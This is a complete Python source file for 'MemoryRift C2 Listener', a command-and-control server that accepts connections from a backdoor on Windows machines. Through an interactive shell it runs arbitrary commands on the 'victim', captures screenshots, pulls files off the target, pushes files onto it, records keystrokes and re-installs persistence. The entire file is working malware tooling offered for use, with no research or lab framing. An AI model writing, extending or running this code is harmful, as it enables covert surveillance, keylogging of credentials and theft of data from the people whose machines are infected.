#!/usr/bin/env python3
"""
MemoryRift C2 Listener – CLI version
All commands: screenshot, download, upload, keylog_start, persist, cd, cat, vuln, and any Windows command.
"""

import socket
import threading
import sys
import os
import time
from datetime import datetime
from colorama import init, Fore, Style

init(autoreset=True)

# ==================== CONFIG ====================
LISTEN_HOST = '192.168.0.251'
LISTEN_PORT = 50005
BUFFER_SIZE = 4096
SCREENSHOT_DIR = "screenshots"
DOWNLOAD_DIR = "downloads"
UPLOAD_DIR = "uploads"
KEYLOG_DIR = "keylogs"
LOG_FILE = "memoryrift_activity.log"

for d in [SCREENSHOT_DIR, DOWNLOAD_DIR, UPLOAD_DIR, KEYLOG_DIR]:
    os.makedirs(d, exist_ok=True)

# ==================== UTILITIES ====================
C = Fore.CYAN
G = Fore.GREEN
R = Fore.RED
Y = Fore.YELLOW
RESET = Style.RESET_ALL

def log_activity(msg):
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_FILE, "a") as f:
        f.write(f"[{ts}] {msg}\n")
    print(f"{C}[LOG]{RESET} {msg}")

def recv_line(sock, timeout=5):
    """Receive a line (ending with \n) – returns string without newline."""
    sock.settimeout(timeout)
    data = b''
    while True:
        try:
            ch = sock.recv(1)
            if not ch:
                return None
            if ch == b'\n':
                break
            data += ch
        except socket.timeout:
            return None
    sock.settimeout(None)
    return data.decode(errors='ignore')

def recv_exact(sock, length, timeout=30):
    """Receive exactly `length` bytes."""
    sock.settimeout(timeout)
    data = b''
    while len(data) < length:
        try:
            chunk = sock.recv(min(BUFFER_SIZE, length - len(data)))
            if not chunk:
                return None
            data += chunk
        except socket.timeout:
            return None
    sock.settimeout(None)
    return data

def drain_until_empty_line(sock):
    """Read lines until an empty line (just '\\n') is received.
       This consumes the extra newline that payload sends after most commands."""
    while True:
        line = recv_line(sock, timeout=1)
        if line is None:
            break
        if line == "":
            break

# ==================== COMMAND HANDLERS ====================
def handle_screenshot(sock, target_id):
    """Receive BMP screenshot."""
    size_line = recv_line(sock)
    if not size_line:
        log_activity(f"{R}Screenshot: no size received{RESET}")
        return
    try:
        file_size = int(size_line.strip())
    except ValueError:
        log_activity(f"{R}Screenshot: invalid size '{size_line}'{RESET}")
        return
    log_activity(f"Screenshot size: {file_size} bytes")
    bmp_data = recv_exact(sock, file_size)
    if not bmp_data:
        log_activity(f"{R}Screenshot: incomplete data{RESET}")
        return
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"{SCREENSHOT_DIR}/screenshot_{target_id}_{ts}.bmp"
    with open(filename, "wb") as f:
        f.write(bmp_data)
    log_activity(f"{G}Screenshot saved: {filename}{RESET}")
    drain_until_empty_line(sock)

def handle_download(sock, target_id, filename):
    """Receive a file from victim."""
    drain_until_empty_line(sock)
    size_line = recv_line(sock)
    if not size_line:
        log_activity(f"{R}Download: no size received{RESET}")
        return
    try:
        file_size = int(size_line.strip())
    except ValueError:
        log_activity(f"{R}Download: invalid size '{size_line}'{RESET}")
        return
    if file_size == 0:
        log_activity(f"{R}File not found on target{RESET}")
        return
    log_activity(f"Download size: {file_size} bytes")
    file_data = recv_exact(sock, file_size)
    if not file_data:
        log_activity(f"{R}Download: incomplete data{RESET}")
        return
    safe_name = filename.replace(':', '_').replace('\\', '_').replace('/', '_')
    save_path = os.path.join(DOWNLOAD_DIR, safe_name)
    with open(save_path, "wb") as f:
        f.write(file_data)
    log_activity(f"{G}Downloaded to: {save_path}{RESET}")
    drain_until_empty_line(sock)

def handle_upload(sock, target_id, local_path):
    """Upload a file to victim."""
    if not os.path.isfile(local_path):
        log_activity(f"{R}Upload: file not found '{local_path}'{RESET}")
        return
    sock.sendall(b'upload dummy\n')
    file_size = os.path.getsize(local_path)
    sock.sendall(f"{file_size}\n".encode())
    time.sleep(0.2)
    with open(local_path, "rb") as f:
        while True:
            chunk = f.read(BUFFER_SIZE)
            if not chunk:
                break
            sock.sendall(chunk)
            time.sleep(0.01)
    resp = recv_line(sock)
    if resp:
        print(f"{G}{resp}{RESET}")
    drain_until_empty_line(sock)

def handle_keylogger(sock, target_id):
    """Capture keystrokes until idle for 1 second."""
    started = recv_line(sock)
    if started:
        print(f"{G}{started}{RESET}")
    drain_until_empty_line(sock)

    log_file = f"{KEYLOG_DIR}/keylog_{target_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    with open(log_file, "wb") as kf:
        sock.settimeout(1.0)
        print(f"{G}[*] Receiving keylogger data... Press Ctrl+C to stop{RESET}")
        try:
            while True:
                try:
                    data = sock.recv(BUFFER_SIZE)
                    if not data:
                        break
                    print(data.decode(errors='ignore'), end='')
                    kf.write(data)
                    kf.flush()
                except socket.timeout:
                    break
        except KeyboardInterrupt:
            pass
        finally:
            sock.settimeout(None)
    log_activity(f"{G}Keylogger data saved to {log_file}{RESET}")
    drain_until_empty_line(sock)

def handle_generic_command(sock, cmd):
    """Send a command and read output until the terminating empty line."""
    sock.sendall(cmd.encode() + b'\n')
    output_lines = []
    while True:
        line = recv_line(sock, timeout=2)
        if line is None:
            break
        if line == "":
            break
        output_lines.append(line)
    if output_lines:
        print("\n".join(output_lines))

# ==================== MAIN SHELL ====================
def interactive_shell(sock, target_id):
    """Command loop with proper per-command handling."""
    banner = recv_line(sock)
    if banner and banner.strip():
        print(f"{G}{banner}{RESET}")

    while True:
        try:
            cmd = input(f"{C}[{target_id}]{RESET} $ ").strip()
            if not cmd:
                continue

            if cmd.lower() in ('exit', 'quit'):
                sock.sendall(b'q\n')
                break
            elif cmd.lower() == 'help':
                print(f"""
{C}Available commands:{RESET}
  help                 - this help
  exit/quit            - close session
  screenshot           - take screenshot (BMP)
  download <file>      - download file from victim (supports spaces)
  upload <local path>  - upload file to victim
  keylog_start         - start keylogger (press Ctrl+C to stop capture)
  persist              - re-install persistence
  cd [dir]             - change directory
  cat <file>           - show file content
  vuln <string>        - simulate buffer overflow
  <any cmd>            - run command on victim (dir, ipconfig, etc.)
                """)
                continue

            if cmd == 'screenshot':
                sock.sendall(b'screenshot\n')
                handle_screenshot(sock, target_id)
            elif cmd.startswith('download '):
                filename = cmd[9:].strip()
                sock.sendall(cmd.encode() + b'\n')
                handle_download(sock, target_id, filename)
            elif cmd.startswith('upload '):
                local_path = cmd[7:].strip()
                handle_upload(sock, target_id, local_path)
            elif cmd == 'keylog_start':
                sock.sendall(b'keylog_start\n')
                handle_keylogger(sock, target_id)
            elif cmd == 'persist':
                sock.sendall(b'persist\n')
                resp = recv_line(sock)
                if resp:
                    print(f"{G}{resp}{RESET}")
                drain_until_empty_line(sock)
            elif cmd.startswith('cd ') or cmd.startswith('cat ') or cmd.startswith('vuln '):
                handle_generic_command(sock, cmd)
            else:
                handle_generic_command(sock, cmd)

        except (socket.error, ConnectionResetError, BrokenPipeError) as e:
            log_activity(f"{R}Connection lost to {target_id}: {e}{RESET}")
            break
        except KeyboardInterrupt:
            print(f"\n{Y}Interrupted. Type 'exit' to quit.{RESET}")
            continue

# ==================== SERVER ====================
def handle_client(client_sock, addr):
    target_id = f"{addr[0]}:{addr[1]}"
    log_activity(f"{G}New connection from {target_id}{RESET}")
    try:
        interactive_shell(client_sock, target_id)
    except Exception as e:
        log_activity(f"{R}Error with {target_id}: {e}{RESET}")
    finally:
        client_sock.close()
        log_activity(f"{Y}Connection closed: {target_id}{RESET}")

def start_listener():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((LISTEN_HOST, LISTEN_PORT))
    server.listen(5)
    print(f"""
{Fore.CYAN}╔══════════════════════════════════════════════════════════════╗
║         MEMORYRIFT C2 LISTENER                                 ║
║                                                                  ║
║  Listening on {LISTEN_HOST}:{LISTEN_PORT}                            ║
║  Waiting for backdoor connections...                            ║
║  All commands work: screenshot, download, upload, keylogger    ║
╚══════════════════════════════════════════════════════════════╝{Style.RESET_ALL}
    """)
    log_activity(f"Listener started on port {LISTEN_PORT}")
    while True:
        try:
            client, addr = server.accept()
            threading.Thread(target=handle_client, args=(client, addr), daemon=True).start()
        except KeyboardInterrupt:
            print(f"\n{Y}Shutting down...{RESET}")
            break
        except Exception as e:
            log_activity(f"{R}Accept error: {e}{RESET}")
    server.close()

if __name__ == "__main__":
    start_listener()
